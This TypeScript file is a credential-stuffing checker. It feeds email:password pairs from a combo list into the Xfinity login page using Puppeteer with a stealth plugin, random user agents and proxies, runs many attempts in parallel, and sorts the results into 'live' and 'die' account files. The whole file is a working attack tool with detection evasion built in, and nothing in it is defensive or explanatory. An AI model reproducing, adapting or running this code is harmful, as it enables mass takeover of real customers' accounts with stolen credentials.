import puppeteer from "puppeteer-extra";
import stealth from "puppeteer-extra-plugin-stealth";
import config from "./config";
import { mapLimit } from "async";
import { appendFileSync, readFileSync } from "fs";
import { collect } from "collect.js";
import { InvalidEmailError } from "./exceptions/invalid-email";
import { InvalidPasswordError } from "./exceptions/invalid-password";
import { ResetPasswordRequired } from "./exceptions/reset-password";

puppeteer.use(stealth());

type CheckLoginProps = {
  email: string;
  password: string;
};

const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

const userAgents: string[] = [];

for (let index = 100; index <= 999; index++) {
  userAgents.push(
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${index}.0.0.0 Safari/537.36`,
  );
}

let launchArgs = [];

if (config.proxy.host && config.proxy.port) {
  launchArgs.push(`--proxy-server=${config.proxy.host}:${config.proxy.port}`);
}

const checkLogin = async ({ email, password }: CheckLoginProps) => {
  const browser = await puppeteer.launch({
    headless: config.headless,
    args: launchArgs,
  });

  const [page] = await browser.pages();

  // Set proxy authentication
  if (config.proxy.username && config.proxy.password) {
    await page.authenticate({
      username: config.proxy.username,
      password: config.proxy.password,
    });
  }

  // Set user agent to avoid detection
  await page.setUserAgent(`${collect(userAgents).random()}`);

  // Set default navigation timeout to 120 seconds
  await page.setDefaultNavigationTimeout(120000);
  await page.setDefaultTimeout(120000);

  try {
    // Navigate to the Xfinity login page
    await page.goto("https://login.xfinity.com/login", {
      waitUntil: "networkidle2",
    });

    // wait for input email selector
    await page.waitForSelector("input#user");

    // Fill in the email input
    await page.type("input#user", email);

    // delay before click submit
    await delay(500);

    // Click the submit button
    await page.$eval("button#sign_in", (el) => el.click());

    // Wait for navigation
    await page.waitForNavigation({ waitUntil: "networkidle2" });

    // Throw error when hint-container selector appear
    if (await page.$("span.hint-container")) {
      const emailErrorMessage = await page.$eval(
        "span.hint-container > prism-text.invalid-text",
        (el) => el.textContent,
      );

      throw new InvalidEmailError(
        // prettier-ignore
        emailErrorMessage || `an error occurred when trying to enter the email.`,
      );
    }

    // throw error if password need to be reset.
    if (await page.$('prism-text[display="body1"]')) {
      const errorMessage = await page.$eval(
        'prism-text[display="body1"]',
        (el) => el.textContent,
      );

      throw new ResetPasswordRequired(
        errorMessage || "Password need to be reset.",
      );
    }

    // wait for password selector
    await page.waitForSelector(`input#passwd`);

    // Fill in the password input if the email is valid
    await page.type("input#passwd", password);

    // delay before click submit
    await delay(500);

    // Click the submit button for the password
    await page.$eval("button#sign_in", (el) => el.click());

    // Wait for navigation
    await page.waitForNavigation({ waitUntil: "networkidle2" });

    // Throw error when hint-container selector appear
    if (await page.$("span.hint-container")) {
      const emailErrorMessage = await page.$eval(
        "span.hint-container > prism-text.invalid-text",
        (el) => el.textContent,
      );

      throw new InvalidPasswordError(
        // prettier-ignore
        emailErrorMessage || `an error occurred when trying to enter the password.`,
      );
    }

    return true;
  } catch (error: any) {
    if (
      error instanceof InvalidEmailError ||
      error instanceof InvalidPasswordError ||
      error instanceof ResetPasswordRequired
    ) {
      throw error;
    } else {
      throw new Error(error?.message || `an unknown error occurred.`);
    }
  } finally {
    await browser.close();
  }
};

const start = async () => {
  let lists = collect(readFileSync(config.listFile, "utf-8").split("\n"))
    .map((line) => line.split(":"))
    .map(([email, password]) => ({ email, password }))
    .filter(({ email, password }) => Boolean(email) && Boolean(password));

  await mapLimit(
    lists.toArray() as CheckLoginProps[],
    config.threadSize,
    async ({ email, password }: CheckLoginProps) => {
      const start = new Date().getTime();
      const emailPassword = `${email}|${password}`;

      try {
        const loginStatus = await checkLogin({ email, password });

        if (loginStatus) {
          appendFileSync("results/live.txt", `${emailPassword}\n`);
        } else {
          appendFileSync("results/die.txt", `${emailPassword}\n`);
        }

        const end = new Date().getTime();
        const elapsedTime = start - end;

        console.log(
          `${elapsedTime} milliseconds: ${emailPassword} - ${
            loginStatus ? "LIVE" : "DIE"
          }`,
        );
      } catch (error: any) {
        const errorMessage = error?.message || "an unknown error occurred.";

        if (error instanceof InvalidEmailError) {
          appendFileSync(
            "results/invalid-email.txt",
            `${emailPassword}|${errorMessage}\n`,
          );
        } else if (error instanceof InvalidPasswordError) {
          appendFileSync(
            "results/invalid-password.txt",
            `${emailPassword}|${errorMessage}\n`,
          );
        } else if (error instanceof ResetPasswordRequired) {
          appendFileSync(
            "results/reset-password-required.txt",
            `${emailPassword}|${errorMessage}\n`,
          );
        } else if (error instanceof Error) {
          appendFileSync(
            "results/general-error.txt",
            `${emailPassword}|${errorMessage}\n`,
          );
        } else {
          appendFileSync(
            "results/general-error.txt",
            `${emailPassword}|${errorMessage}\n`,
          );
        }

        const end = new Date().getTime();
        const elapsedTime = start - end;

        console.log(
          `${elapsedTime} milliseconds: ${emailPassword} - ${errorMessage}`,
        );
      } finally {
        //
      }
    },
  );
};

start();
